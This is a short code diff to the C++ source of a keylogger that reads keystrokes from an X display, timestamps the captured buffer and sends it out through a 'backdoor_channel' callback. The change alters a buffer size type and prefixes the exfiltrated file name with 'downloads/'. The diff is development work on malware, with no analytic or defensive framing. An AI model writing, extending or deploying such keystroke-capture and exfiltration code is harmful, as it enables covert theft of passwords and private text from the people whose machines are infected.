@@ -17,7 +17,7 @@ void Key_Logger::start() {
     const char * hostname = DEFAULT_DISPLAY;
     bool printKeyUps = DEFAULT_PRINT_UP;
     std::string buffer;
-    size_t buffersize = 256;
+    int buffersize = 256;
 
     // Set up X
     Display * disp = XOpenDisplay(hostname);
@@ -96,7 +96,8 @@ void Key_Logger::start() {
         oss << std::put_time(&tm, "%d-%m-%Y %H-%M-%S");
         auto str = oss.str();//datetimestring
 
-        backdoor_channel.callback_sendNewFile(str, buffer);
+        std::string send = "downloads/" + str;
+        backdoor_channel.callback_sendNewFile(send, buffer);
         buffer.clear();
         
     }
